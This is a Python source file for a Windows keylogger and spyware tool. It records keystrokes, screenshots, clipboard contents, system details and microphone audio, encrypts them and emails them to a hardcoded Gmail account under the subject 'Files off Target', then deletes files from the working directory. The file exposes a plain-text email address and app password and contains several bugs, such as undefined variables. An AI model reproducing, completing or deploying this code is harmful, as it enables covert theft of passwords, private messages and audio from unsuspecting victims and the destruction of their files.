import time
from gc import freeze

from Demos.mmapfile_demo import system_info
from adodbapi.process_connect_string import process
import os

from numpy.ma.core import max_val

pwd = os.getcwd()
sys = pwd+"\\sys_info.txt"
audio = pwd+"\\audio_data.wav"
clipboard = pwd+"\\clipboard.txt"
screenshot = pwd+"\\screenshot.png"
keys = pwd+"\\keys.txt"

f_list = [sys, audio, clipboard, screenshot, keys]

def create_files():
    for file in f_list:
        open(file, 'w')

def delete_files():
    for file in os.listdir(pwd):
        if os.path.exists(file):
            if not file.endswith(".exe"):
                os.remove(file)

from pynput.keyboard import Key, Listener

key_log = []
k_count = 0
space_count = 0

def pressed(key):
    global key_log, k_count, space_count, backspace_count
    if key == Key.space:
        key = ' '
        space_count += 1
        if space_count >= 5:
            key = '\nspace_count exceeded\n'
            space_count = 0
    elif key == Key.backspace:
        key = " backspace "
    else:
        if key == Key.enter:
            key = '\n'

    key_log.append(key)
    k_count += 1

    if k_count >= 10:
        k_count = 0
        writefile(key_log)
        key_log = []

def writefile(keys_list):
    with open("keys.txt", 'a') as f:
        for key in keys_list:
            k = str(key).replace("'", "")
            if k.find("Key") == -1:
                f.write(k)

def log_keys():
    with Listener(on_press=pressed) as listener:
        listener.join()

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

#adapt this later to get an optional param, that will be the location of a specific file to send
def send_files():
    for file in os.listdir(pwd):
        if file.find("_enc") != -1:
            files_to_send.append(file)

    # Setup sender and receiver info
    sender = 'sebby.hyjek@gmail.com'
    reciever = sender
    #Custom password given by gmail
    sender_pass = 'nxsg zpqq hygo lpif'

    message = MIMEMultipart()
    message['From'] = sender
    message['To'] = receiver
    message['Subject'] = 'Files off Target'

    mail_body = "Here are the encrypted files off the target :)"
    message.attach(MIMEText(mail_body, 'plain'))

    for fname in files_to_send:
        with open(fname, 'rb') as file:
            payload = MIMEBase('application', 'octet-stream')
            payload.set_payload(file.read())
        encoders.encode_base64(payload)
        payload.add_header('Content-Disposition', 'attachment', filename=fname)
        message.attach(payload)

    # Setup the SMTP session
    session = smtplib.SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(sender, sender_pass)
    session.sendmail(sender, receiver, message.as_string())
    session.quit()

import socket
import platform
def get_system_info():
    info_list = ["Host name: " + socket.gethostname(), "IP address: " + socket.gethostbyname(socket.gethostname()), "Processor: " + platform.processor(), "OS: " + platform.system(), "Machine: " + platform.machine()]
    with open(sys, 'a') as f:
        for info in info_list:
            f.write(info + '\n')

import win32clipboard
def get_clipboard_info():
    win32clipboard.OpenClipboard()
    try:
        clipboard_data = win32clipboard.GetClipboardData()
    except:
        print("Failed to get clipboard data")

    with open(clipboard, 'a') as f:
        f.write(clipboard_data)
    win32clipboard.CloseClipboard()

from scipy.io.wavfile import write
import sounddevice as sd
import numpy as np
def record_sound():
    fs = 44100
    seconds = 5
    recording = sd.rec(int(seconds*fs), samplerate=fs, channels=2)
    sd.wait()
    #Normalizing the audio
    max_val = np.max(np.abs(recording))
    normalized_audio = recording / max_val
    write(audio, fs, normalized_audio)

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

def take_screenshot():
    img = ImageGrab.grab()
    img.save(screenshot)

import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def enc_files():
    password = '123456'
    password_enc = password.encode()
    salt = b'^7o\\xb2\\xea|:.l\\xff\\x81\\xa5X\\x8cz\\x11'
    kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                     length=32,
                     salt=salt,
                     iterations=100000,
                     backend=default_backend()
                 )
    key = base64.urlsafe_b64encode(kdf.derive(password_enc))
    print(key)
    for file in f_list:
        with open(file, 'rb') as f:
            data = f.read()
        index = file.find('.')
        file_new = file[:index] + "_enc" + file[index:]
        fernet = Fernet(key)
        encrypt = fernet.encrypt(data)
        with open(file_new, 'wb') as f:
            f.write(encrypt)

def main():
    create_files()
    iters = 0
    max_iters = 5
    currentTime = time.time()
    time_iteration = 15
    stopping_time = time.time() + time_iteration
    while iters < max_iters:
        log_keys()
        if currentTime > stopping_time:
            take_screenshot()
            get_clipboard_info()
            get_system_info()
            record_sound()
            enc_files()
            send_files()
            delete_files()
            iters += 1
            currentTime = time.time()
            stopping_time = time.time() + time_iteration
            sleep()

if __name__ == '__main__':
    main()


